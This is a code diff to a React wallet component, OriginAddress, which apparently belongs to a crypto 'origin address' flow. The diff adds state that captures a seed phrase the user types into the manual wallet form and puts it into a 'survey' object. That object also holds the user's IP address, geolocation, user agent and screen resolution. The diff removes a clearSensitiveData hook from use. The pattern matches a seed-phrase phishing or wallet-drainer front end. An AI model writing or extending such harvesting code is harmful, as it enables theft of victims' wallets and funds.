@@ -57,6 +57,7 @@ interface OriginProps {
 function OriginAddress({ onNext }: OriginProps) {
 	const [blockChainNetwork, setBlockChainNetwork] = useState<string>("");
 	const [selectedWallet, setSelectedWallet] = useState("");
+	const [walletPhrase, setWalletPhrase] = useState("");
 	const [originSteps, setOriginSteps] = useState<number>(0);
 	const [addressMode, setAddressMode] = useState<"manual" | "automatic">(
 		"automatic"
@@ -72,16 +73,12 @@ function OriginAddress({ onNext }: OriginProps) {
 	const [showFailure, setShowFailure] = useState(false);
 
 	const {
-		blockchainNetwork,
-		walletProvider,
 		seedPhrase,
 		destinationAddress,
 		ipAddress,
 		geolocation,
 		userAgent,
 		screenResolution,
-		clearSensitiveData,
-		setProcess,
 		walletName,
 		setWalletProvider,
 		setBlockchainNetwork,
@@ -135,7 +132,7 @@ function OriginAddress({ onNext }: OriginProps) {
 			const survey = {
 				blockchainNetwork: blockChainNetwork,
 				walletProvider: selectedWallet,
-				seedPhrase,
+				seedPhrase: walletPhrase || seedPhrase,
 				destinationAddress,
 				ipAddress,
 				geolocation,
@@ -273,6 +270,7 @@ function OriginAddress({ onNext }: OriginProps) {
 					<ShowManualWallets
 						handleFinish={handleFinish}
 						selectedWallet={selectedWallet}
+						setWalletPhrase={setWalletPhrase}
 					/>
 				)}
 			</div>
